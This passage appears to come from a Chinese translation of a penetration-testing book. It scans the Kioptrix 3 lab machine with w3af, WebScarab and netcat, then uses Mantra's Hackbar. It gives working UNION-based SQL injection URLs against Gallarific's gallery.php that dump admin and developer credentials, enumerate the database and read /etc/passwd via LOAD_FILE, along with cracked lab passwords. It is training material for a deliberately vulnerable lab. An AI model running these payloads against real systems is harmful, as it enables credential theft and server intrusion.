我们将从设置我们的目标主机开始：

```
w3af>>> target
w3af/config:target>>> set target http://kioptrix3.com

```

在目标菜单中，我们可以将目标设置为`http://kioptrix3.com:`

```
w3af/config:target>>> view 

```

View 将允许我们验证我们的配置。如果您查看屏幕截图，您可以确定目标设置不正确。再次使用 set target 并使用适当的设置将纠正您发现的任何问题。

```
w3af/config:target>>> back 

```

back 命令将带您返回到上一个屏幕。输入 exit 将退出 w3af 控制台，这是我们不想要的。

![使用 w3af 控制台进行扫描](img/7744_05_21.jpg)

```
w3af>>> plugins 

```

我们可以通过在控制台中输入 plugins 来查看已安装的插件。这在确定您想要运行哪些特定项目时非常有用。您还可以从此菜单中获取有关每个插件的信息。

```
w3af/plugins>>> help 

```

如果需要更多信息，或者您只需要刷新您对所有内容的记忆，请在控制台的任何位置使用 help 命令。

```
w3af/plugins>>> back
w3af>>> profiles

```

配置文件部分是理解将要扫描的内容的关键。就像 GUI 一样，配置文件确定启动扫描时将运行哪些插件。

```
w3af/profiles>>> help 

```

为了确保我们运行正确的配置文件，我们检查可用命令以找到提供所需信息的命令。如果您已经了解站点的某些信息，可以通过创建自定义配置文件来节省时间，以匹配您正在扫描的配置。例如，在未使用 IIS 的服务器上扫描 IIS 漏洞是没有意义的。

```
w3af/profiles>>> list 

```

这里提供了可用的预配置配置文件列表。

![使用 w3af 控制台进行扫描](img/7744_05_22.jpg)

```
w3af/profiles>>> use audit_high_risk 

```

use 命令允许我们指定在扫描期间要使用的配置文件。

```
w3af/profiles>>> back 

```

我们返回到 w3af 默认部分，并准备开始配置的扫描。

```
w3af>>> plugins
w3af/plugins>>> output

```

```
|-----------------------------------------------------|
| Plugin name | Status | Conf | Description |
|-----------------------------------------------------|
| console | Enabled | Yes | Print messages to |
| | | | the console. |
| emailReport | | Yes | Email report to |
| | | | specified addresses. |
| gtkOutput | | | Saves messages to |
| | | | kb.kb.getData('gtkOutput', |
| | | | 'queue'), messages |
| | | | are saved in the |
| | | | form of objects. |
| htmlFile | | Yes | Print all messages |
| | | | to a HTML file. |
| textFile | | Yes | Prints all messages |
| | | | to a text file. |
| xmlFile | | Yes | Print all messages |
| | | | to a xml file. |
|-----------------------------------------------------|

```

Output 将允许您设置输出类型，例如 XML、文本文件，甚至 HTML。我们使用默认设置启用`htmlFile`输出（输出到`report.html`），并暂时保持控制台启用。

```
w3af/plugins>>> output htmlFile 

```

这将启用 HTML 输出。

```
w3af>>> start 

```

正如您可能已经猜到的那样，输入`start`将使用我们刚刚配置的设置来启动我们的扫描。如果有错误，请使用我们刚刚审查的命令来检查和纠正错误。记得在卡住并不知道如何继续时使用 help 或 back。

扫描完成后，您将回到 w3af 提示符。查看结果后，我们发现仍然没有明显的发现可以快速轻松地接管机器或获得远程 shell。在这里，我们在 Firefox 中浏览到`report.html`位置，以显示默认的 HTML 报告格式：

![使用 w3af 控制台进行扫描](img/7744_05_23.jpg)

我们需要继续进行一些小的修改，以选择插件以找到有趣的漏洞。插件可以禁用、查看或启用如下：

```
w3af>>> plugins
w3af/plugins>>> help

```

```
|---------------------------------------------------------|
| list | List available plugins. |
|---------------------------------------------------------|
| back | Go to the previous menu. |
| exit | Exit w3af. |
| assert | Check assertion. |
|---------------------------------------------------------|
| audit | View, configure and enable audit plugins |
| grep | View, configure and enable grep plugins |
| evasion | View, configure and enable evasion plugins |
| bruteforce | View, configure and enable bruteforce |
| | plugins |
| discovery | View, configure and enable discovery |
| | plugins |
| mangle | View, configure and enable mangle plugins |
| output | View, configure and enable output plugins |
|---------------------------------------------------------|

```

我们可以通过输入类别（例如`audit`）来查看启用了哪些插件。在这里，我们可以确定在使用`audit_high_risk`配置文件时启用了哪些审计插件。

```
w3af/plugins>>> audit 

```

此命令提供以下控制台输出：

![使用 w3af 控制台进行扫描](img/7744_05_24.jpg)

一些非常重要的插件未启用。我们需要启用`localFileInclude`、`xss`和`rescan`。

```
w3af/plugins>>> audit xss, localFileInclude
w3af/plugins>>> audit

```

验证所有设置是否准确；如果遇到错误，请重新设置目标，然后重新开始扫描。扫描完成后，查看结果。您应该注意到已检测到本地文件包含漏洞。我们还在[`kioptrix3.com/gallery`](http://kioptrix3.com/gallery)上检测到许多未知的 Web 应用程序错误。我们可以重新进入扫描程序并启用所有插件，然后再次尝试，或者我们可以手动查看可疑的 URL。

### 使用 WebScarab 作为 HTTP 代理

启用 Web 代理并记录所有手动渗透测试活动是有益的。毕竟，您需要能够复制您的步骤，并撰写指示测试过程中所采取的步骤的报告。在 BackTrack 中，可以通过选择**应用程序 | BackTrack | 漏洞评估 | Web 应用程序评估 | Web 漏洞扫描程序 | WebScarab**找到 WebScarab。

### 注意

WebScarab 最初将使用 WebScarab Lite 界面。可以通过使用**工具**下拉菜单并选择**使用完整界面**来更改，并重新启动工具。

WebScarab 是 OWASP 团队提供的 HTTP 代理，将帮助分析您的 HTTP 流量。一旦启动，我们需要将浏览器指向使用代理。

加载 Firefox，选择**编辑 | 首选项 | 选项 | 高级选项卡 | 网络选项卡**，然后单击**设置**按钮。选择**手动配置代理：**单选按钮，并配置以下设置：

+   **HTTP 代理：**localhost | 端口：8008。

+   **SSL 代理：**localhost | 端口：8008。

+   **不使用代理：**删除此处的条目。空白。

默认监听器应该能够捕获您的会话。现在在浏览器中转到[`kioptrix3.com`](http://kioptrix3.com)。如果一切正常，并且没有收到错误，请转到[`kioptrix3.com/gallery/`](http://kioptrix3.com/gallery/)，然后返回到 WebScarab 并选择**摘要**选项卡以查看我们的代理结果：

![使用 WebScarab 作为 HTTP 代理](img/7744_05_25.jpg)

有一件事立即确认了 w3af 遇到的未知应用程序错误问题。在尝试进行 SQL 注入攻击之前，URL [`kioptrix3.com/gallery/`](http://kioptrix3.com/gallery/)已经返回了 500 应用程序错误。自动化扫描程序很难处理异常行为，因此，我们必须进一步调查。如果这个概念在这个时候让您感到困惑，请尝试以下方法来确认我们的怀疑是正确的。打开一个新的 BackTrack 终端会话并调用 netcat：

```
# nc kioptrix3.com 80 

```

当连接建立时，输入以下内容：

```
GET http://kioptrix3.com/gallery/ 

```

我们直接获取数据，这样可以更好地控制信息。如果有疑问，使用 netcat！输出如下：

```
HTTP/1.0 500 Internal Server Error 
Date: Sun, 04 Dec 2011 23:36:00 GMT
Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
X-Powered-By: PHP/5.2.4-2ubuntu5.6
Set-Cookie: PHPSESSID=f04693abb030c65c52014ea6bb99aafb; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 5653
Connection: close
Content-Type: text/html

```

突出显示的部分确认应用程序立即返回错误代码和请求的页面。

现在是时候使用 WebScarab 拦截我们的消息，看看我们正在处理什么。在 WebScarab 中打开**代理**选项卡，点击**手动编辑**选项卡，并选中**拦截响应**框。通过拦截响应，我们能够查看传递给服务器的数据包，看看是否有任何有趣的内容。现在，如果需要，我们也可以更改任何变量或隐藏字段。

现在我们正在拦截，回到浏览器屏幕并重新加载[`kioptrix3.com/gallery/`](http://kioptrix3.com/gallery/)页面。您将看到以下内容：

![使用 WebScarab 作为 HTTP 代理](img/7744_05_26.jpg)

被拦截的数据将包括以解析和原始格式返回的响应。您必须了解正常响应应该是什么样子的。这些是能够帮助您在 Web 应用程序中发现漏洞的线索。在这种情况下，我们可以再次看到服务器在其标头中以 500 内部服务器错误的形式响应。当查看原始源时，我们还看到一些关于 Gallarific 的引用。与任何软件一样，当您能够确定正在运行的内容时，您应该快速查找已知的漏洞。

### 注意

记住这个过程：找出正在运行的内容，确定它是否设置正确和/或是否存在已知的漏洞，然后进行测试。

前往[`www.exploit-db.com`](http://www.exploit-db.com)搜索 GALLARIFIC。当前结果如下：

![使用 WebScarab 作为 HTTP 代理](img/7744_05_27.jpg)

我们有三种不同的利用程序可供选择，仅针对这个简单的应用程序。这甚至没有计算我们能够使用自动化工具找到的本地文件注入。如果您选择列表中的顶部项目，即**GALLARIFFIC PHP 照片库**利用程序，您将看到提交利用程序的人甚至很好地包括了指向管理面板的路径[`kioptrix3.com/gallery/gadmin/`](http://kioptrix3.com/gallery/gadmin/)，以防我们在以前的扫描结果中错过了它（还记得看到有关某些有趣内容被注释掉的通知吗：`<!-- a href="gadmin">Admin</a>&nbsp; &nbsp; -->`）。

### 注意

请记住，exploit-db 已经在您的 BackTrack 机器上！如果您像应该一样在分段网络上，就没有理由离开以下载利用代码或概念证明说明。您已经在您的机器上拥有它！

如果您正确地搜索了 Gallarific，您还会发现其他漏洞。以下是一些相关的 CVE 参考：

+   CVE-2008-1326

+   CVE-2008-1327

+   CVE-2008-1464

+   CVE-2008-1469

+   CVE-2008-6567

### 提示

在尝试查找有关软件漏洞的信息时，OSVDB（开放源代码漏洞数据库）[`osvdb.org/`](http://osvdb.org/)也是一个很好的资源。如果您找到一个有漏洞的软件版本，很可能您还会找到任何相关的概念证明代码（如果存在的话），因为 Exploit-DB 团队已经在确保他们的 CVE 与 OSVDB 相匹配上花费了很多精力。

现在看一下利用定义，我们看到提供了示例代码（感谢 AtT4CKxT3rR0r1ST 将此概念证明利用代码提交给`Exploit-DB.com）`：

```
www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users-- 

```

### 提示

除非您希望确认每个响应，否则请关闭拦截。

当然，为了使用这个例子，我们需要做一些更改。首先，我们需要更正[www.site.com](http://www.site.com)条目。将其替换为`kioptrix3.com`。然后我们需要添加我们的图库子文件夹，以便我们访问正确的站点：

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users-- 

```

如果您尝试此代码，您会发现它并没有按计划工作。我们需要回到我们的 Web 应用程序测试基础知识，并确定问题所在。让我们在这里尝试一些东西，看看会发生什么。我们将简化查询并查看是否有效。

```
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=2%20union%20select%201,2,3,4,5,6,7,8 

```

作为回应，我们仍然收到以下错误：

```
The used SELECT statements have a different number of columns. Could not select category

```

如果您熟悉 SQL 注入，您已经知道问题所在。我们正在处理太多列。现在我们将通过列计数进行迭代，直到我们不再收到错误消息。尝试以下操作：

```
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=2%20union%20select%201,2,3,4,5,6 

```

现在我们看到了更有趣的东西。我们的 SQL 注入成功了！接下来，我们将修改概念证明代码如下，并尝试一下：

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users-- 

```

此命令将为我们提供用户名`admin`和密码`n0t7t1k4`。使用此信息登录[`kioptrix3.com/gallery/gadmin`](http://kioptrix3.com/gallery/gadmin)并浏览一下。您可以访问应用程序的管理员权限，但尚未获得对机器本身的 root 访问权限。现在您知道可以使用 SQL 注入来获取数据库中的任何内容，请考虑您可能还能获取到什么其他信息；也不要忘记我们的文件包含漏洞！我们对 Kioptrix level 3 的旅程尚未完成。

# Mantra 简介

Mantra 浏览器为渗透测试人员提供了许多工具，使 Web 应用程序测试变得高效和有趣。它利用了多年来编写的许多基于浏览器的插件，并可在[`getmantra.com`](http://getmantra.com)上获得。一定要查看该网站提供的一些精心编写和详细的教程，因为它们提供了基本知识以外的用例示例。我们将使用 Mantra 中的插件以高效的方式充分利用我们实验室中的 Kioptrix 3 机器。在这个例子中，我们利用的主要插件是 Hackbar。您可以在[`addons.mozilla.org/en-US/firefox/addon/hackbar/`](http://https://addons.mozilla.org/en-US/firefox/addon/hackbar/)了解更多关于 Hackbar 的信息。Hackbar 和 Mantra 中的其他附加组件使测试 Web 应用程序变得有趣，并允许知识渗透测试人员手动验证 Web 应用程序的安全性。

### 注意

您仍需要了解 Web 应用程序安全性的工作原理，以及如何手动执行这些测试；Mantra 只是通过提供许多手动测试所需的工具，使这个过程更加方便和高效。使用 Mutillidae 安装来填补您在测试常见 Web 应用程序安全问题方面的任何空白。

1.  我们的第一步是在 BackTrack 机器上打开 Mantra 浏览器。可以通过导航菜单选择**BackTrack** | **Vulnerability Assessment** | **Vulnerability Scanners** | **Mantra**找到 Mantra。

1.  在 Mantra 中，使用浏览器的 URL 导航栏（[`kioptrix3.com`](http://kioptrix3.com)）浏览托管在您的 Kioptrix 1.2 虚拟服务器上的网页。

1.  在 Mantra 中使用 hackbar 输入以下 URL，然后单击**Execute**按钮：

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users-- 

```

1.  您应该看到用户名`admin`和密码`n0t7t1k4`。

1.  让我们看看如何获取其他信息。在 hackbar 中输入以下内容：[`kioptrix3.com/gallery/gallery.php?id=1`](http://kioptrix3.com/gallery/gallery.php?id=1)，然后单击**Execute**。

1.  现在将光标放在 hackbar 中[`kioptrix3.com/gallery/gallery.php?id=1`](http://kioptrix3.com/gallery/gallery.php?id=1)条目的末尾，添加一个空格，然后直接在 hackbar 上方单击**SQL** | **Union Select Statement**，在弹出的窗口中输入`6`，然后单击**OK**。单击 hackbar 上的**Execute**按钮，以验证 SQL 注入是否有效。

1.  现在，通过突出显示生成的查询并单击**SQL | MySQL | Basic Info Column**，将查询中的数字`2`替换为`2`，以便您的 URL 现在看起来像这样：[`kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),@@version),3,4,5,6`](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,CONCAT_WS(CHAR(32,58,32),user(),database(),@@version),3,4,5,6)。单击 hackbar 上的**Execute**，并查看结果。输出应包含以下信息：`root@localhost : gallery : 5.0.51a-3ubuntu5.4`。您已成功枚举了正在运行的用户、数据库名称和版本。

1.  此时，您可以使用任何典型的 SQL 注入技巧来枚举这个数据库。尝试运行不同的命令，比如[`kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()`](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,table_name,3,4,5,6%20from%20information_schema.tables%20where%20table_schema=database())，这将列出当前数据库中的所有表。

1.  我们已经可以使用常用的 SQL 注入代码访问服务器上的某些文件，比如[`kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6`](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,LOAD_FILE('/etc/passwd'),3,4,5,6)。这将列出服务器上的 passwd 文件。

1.  为了获取开发用户的帐户信息，我们可以使用[`kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,username,password,4,5,6 from dev_accounts`](http://kioptrix3.com/gallery/gallery.php?id=1%20UNION%20SELECT%201,username,password,4,5,6%20from%20dev_accounts)，这为我们提供了用户名`loneferret`的信息，密码哈希值为`5badcaf789d3d1d09794d8f021f40f0e`，以及用户`dreg`的密码哈希值为`0d3eccfb887aabd50f243b3f155c0f85`。我们可以尝试破解这些用户密码。成功破解密码将为您提供以下凭据：`dreg` - `Mast3r`和`loneferret` - `starwars`。

这些用户陷入了重复使用密码的陷阱。您现在可以通过从 BackTrack 到 Kioptrix 机器打开 SSH 会话来登录您的实验室中的 Kioptrix 1.2 机器。幸运的是，这些帐户不在 sudoers 列表中。现在我们需要提升其中一个帐户的权限。

### 注意

此时，您几乎已经获得了 Kioptrix Level 1.2 机器的 root 权限。花点时间四处看看服务器，尝试找出提升用户权限的方法。

一旦您使用 SSH 获得了 root 权限，通过网站上传一个 shell 到 Kioptrix Level 1.2 机器，再次挑战自己！有几种不同的方法可以实现这一点，如果遇到困难，可以参考网络上的许多攻略。

# 摘要

我们有机会真正开始构建我们的测试环境，设置 Kioptrix、pfSense、Muttilidae、HAProxy 等工具。在我们的实验室中使用这些工具有助于我们更好地理解我们正在测试的技术。最好的渗透测试人员具有丰富的 IT 经验，这样他们在测试和解释概念以及向客户解释控制措施时都能够充分利用。

我们还学会了如何使用工具如`lbd`来确定系统是否正在进行负载平衡，以及使用 Wafw00f 来寻找 Web 应用程序防火墙。熟能生巧，考虑到这一点，每一步都被定义得可以让您跟随并对技术充满信心，或者只是简单地更新您已经具有的重要技能。毕竟，在安全领域有很多需要记住的东西，很容易失去实践。

我们使用了 w3af 图形用户界面，然后使用了我最喜欢的 w3af 控制台，如果您想要更高效，可以对其进行脚本化。使用 Kioptrix 1.2，我们能够逐步了解如果您试图渗透客户的大型 Web 应用程序可能采取的不同步骤。我们讨论了有时自动化工具并不足以找到漏洞，因此浏览器和 WebScarab 等 HTTP 代理可以决定一个渗透测试的好坏。我们还向您介绍了 Mantra，它将通过提供社区创建的许多插件来帮助安全专业人员执行工作，从而使您的 Web 应用程序测试更加高效。

我们学到的最后一件事是，Web 应用程序测试是一门复杂而艰难的艺术。如果你遇到问题，永远不要放弃，继续努力！

下一章将深入探讨利用和客户端攻击。我们将学习缓冲区溢出，甚至创建我们自己的易受攻击程序。我们还讨论了不同的模糊测试工具，如 BED 和 sfuzz。我们深入研究了 Fast-Track 以及如何用它来设置大规模的网络攻击。我们还涉及了防病毒软件的规避和重新打包载荷。最重要的是，我们讨论了社会工程工具包，这应该是每个渗透测试人员工具箱中不可或缺的部分。
